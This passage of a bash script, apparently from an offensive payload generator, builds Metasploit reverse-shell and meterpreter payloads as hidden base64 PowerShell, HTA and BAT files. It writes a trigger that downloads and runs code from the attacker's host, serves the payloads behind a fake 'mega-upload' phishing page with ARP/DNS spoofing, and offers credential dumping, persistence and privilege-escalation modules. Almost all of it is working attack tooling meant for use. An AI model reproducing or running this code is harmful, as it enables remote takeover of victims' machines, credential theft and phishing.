            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm -r $H0m3/.psploit > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.bat > /dev/null 2>&1
rm $IPATH/bin/sedding.raw > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# -----------------------------------------------------
# build shellcode in HTA-PSH format (windows-platforms)
# reproduction of hta powershell attack in unicorn.py
# one of my favorite methods by ReL1K :D 
# -----------------------------------------------------
sh_shellcode10 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> HTA-PSH format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : HTA-PSH -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f hta-psh > $IPATH/output/chars.raw"

echo ""
# display generated shelcode
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
store=`cat $IPATH/output/chars.raw | awk {'print $7'}`
echo $store
echo "" && echo ""
# grab shellcode from chars.raw
Sh33L=`cat $IPATH/output/chars.raw | grep "powershell.exe -nop -w hidden -e" | cut -d '"' -f2`
# copy chars.raw to hta_attack dir
cp $IPATH/output/chars.raw $IPATH/templates/hta_attack/chars.raw
sleep 2


   # check if all dependencies needed are installed
   # check if template exists
   if [ -e $InJEc6 ]; then
      echo "[☠] exec.hta -> found!"
      sleep 2
   else
      echo "[☠] exec.hta -> not found!"
      exit
   fi

   if [ -e $InJEc7 ]; then
      echo "[☠] index.html -> found!"
      sleep 2
   else
      echo "[☠] index.html -> not found!"
      exit
   fi

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# EDITING/BACKUP FILES NEEDED
N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Launcher" --width 300) > /dev/null 2>&1
echo "[☠] editing/backup files..."
cp $InJEc6 $IPATH/templates/hta_attack/mine[bak].hta
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html

cd $IPATH/templates/hta_attack
# use SED to replace NaM3 and Inj3C
echo "[☠] Injecting shellcode -> $N4m.hta!"
# replace NaM3 by $N4m (var grab by venom.sh)
sed "s|NaM3|$N4m.hta|g" index.html > copy.html
mv copy.html $IPATH/output/index.html
# replace INj3C by shellcode stored in var Sh33L in 'meu_hta-psh.hta' file
sed "s|Inj3C|$Sh33L|g" exec.hta > $N4m.hta
cp $IPATH/templates/phishing/missing_plugin.png $ApAcHe/missing_plugin.png > /dev/null 2>&1
mv $N4m.hta $IPATH/output/$N4m.hta > /dev/null 2>&1
chown $user $IPATH/output/$N4m.hta > /dev/null 2>&1


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.hta\n$IPATH/output/index.html\n\nIf needed further encrypt your hta using:\nshell/obfuscate/hta-to-javascript-crypter.html\nbefore continue...\n\nchose how to deliver: $N4m.hta" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 350 --height 300) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store the 2 files in apache2 webroot and\nSend: [ http://$lhost/index.html ]\nto target machine to execute payload" --info > /dev/null 2>&1
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 320) > /dev/null 2>&1


  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi




      cd $IPATH/output
      cp $N4m.hta $ApAcHe/$N4m.hta > /dev/null 2>&1
      cp index.html $ApAcHe/index.html > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.hta|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.hta $ApAcHe/$N4m.hta
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/hta_attack/mine[bak].hta $InJEc6 > /dev/null 2>&1
mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
rm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $IPATH/output/index.html > /dev/null 2>&1
rm $ApAcHe/$N4m.hta > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm $ApAcHe/missing_plugin.png > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# --------------------------------------------------------------
# build shellcode in PS1 (windows systems)
# 'Matthew Graeber' powershell <DownloadString> technic
# --------------------------------------------------------------
sh_shellcode11 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> psh-cmd format ..."
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PSH-CMD -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "sudo msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw" > /dev/null 2>&1
str0=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo "$str0" > $IPATH/output/chars.raw


# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 3
echo $str0
echo "" && echo ""

# EDITING/BACKUP FILES NEEDED
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi



cd $IPATH/output/
# compiling to ps1 output format
echo "[☠] Injecting shellcode -> $N4m.ps1!"
sleep 2
echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
sed "s|Sh33L|$str0|" payload.raw > $N4m.ps1
rm $IPATH/output/payload.raw > /dev/null 2>&1


# build trigger.bat (x86) to call .ps1
echo "[☠] Building ps1 -> trigger.bat..."
sleep 2
echo ":: powershell template | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
echo ":: Matthew Graeber - DownloadString" >> $IPATH/output/trigger.bat
echo ":: Download/execute payload in RAM" >> $IPATH/output/trigger.bat
echo ":: ---" >> $IPATH/output/trigger.bat
echo "@echo off" >> $IPATH/output/trigger.bat
echo "echo [*] Please wait, preparing software ..." >> $IPATH/output/trigger.bat
echo "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://$lhost/$N4m.ps1')" >> $IPATH/output/trigger.bat



# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ps1\n$IPATH/output/trigger.bat\n\nchose how to deliver: trigger.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store $N4m in apache2 webroot and\nexecute trigger.bat on target machine" --info > /dev/null 2>&1
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 350 --height 320) > /dev/null 2>&1

  if [ "$P0" = "Invoke-Phantom.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/Invoke-Phant0m.rb $pHanTom/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|trigger.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.ps1 $ApAcHe/$N4m.ps1 > /dev/null 2>&1
      cp trigger.bat $ApAcHe/trigger.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|trigger.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.ps1 $ApAcHe/$N4m.ps1
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.ps1 > /dev/null 2>&1
rm $ApAcHe/trigger.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (windows BAT) ReL1K :D 
# reproduction of powershell.bat payload in unicorn.py
# ----------------------------------------------------
sh_shellcode12 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1

# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 350) > /dev/null 2>&1

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
# display final settings to user
cat << !

 shellcode settings
+------------------
| LPORT   : $lport
| LHOST   : $lhost
| FORMAT  : PSH-CMD -> WINDOWS
|_PAYLOAD : $paylo

!

# use metasploit to build shellcode
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`

# display shellcode
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name
cd $IPATH/output/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2
echo ":: powershell bat template | Author: r00t-3xp10it" > $N4m.bat
echo ":: unicorn - reproduction (base64 encoded)" >> $N4m.bat
echo ":: ---" >> $N4m.bat
echo "@echo off" >> $N4m.bat
echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
chmod +x $IPATH/output/$N4m.bat


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else
          xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" FALSE "exploit_suggester.rc" FALSE "Invoke-Phantom.rc" --width 305 --height 370) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -rc')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
